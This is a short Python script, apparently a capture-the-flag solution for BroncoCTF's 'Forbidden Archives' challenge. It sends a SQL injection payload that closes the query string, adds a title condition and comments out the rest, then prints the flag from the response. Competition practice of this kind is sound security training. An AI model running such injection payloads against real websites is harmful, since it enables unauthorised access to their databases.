#!/usr/bin/env python3
"""Exploit the SQL injection in Forbidden Archives and print the flag."""

import re
import sys

import requests

URL = "https://broncoctf-forbidden-archives.chals.io/"
PAYLOAD = "') AND lower(title) LIKE lower('%All%Knowledge%') -- -"


def main() -> None:
    response = requests.get(URL, params={"search": PAYLOAD}, timeout=15)
    response.raise_for_status()

    flag = re.search(r"bronco\{[^\s<}]+\}", response.text)
    if not flag:
        print("Flag was not present in the response.", file=sys.stderr)
        sys.exit(1)
    print(flag.group(0))


if __name__ == "__main__":
    main()
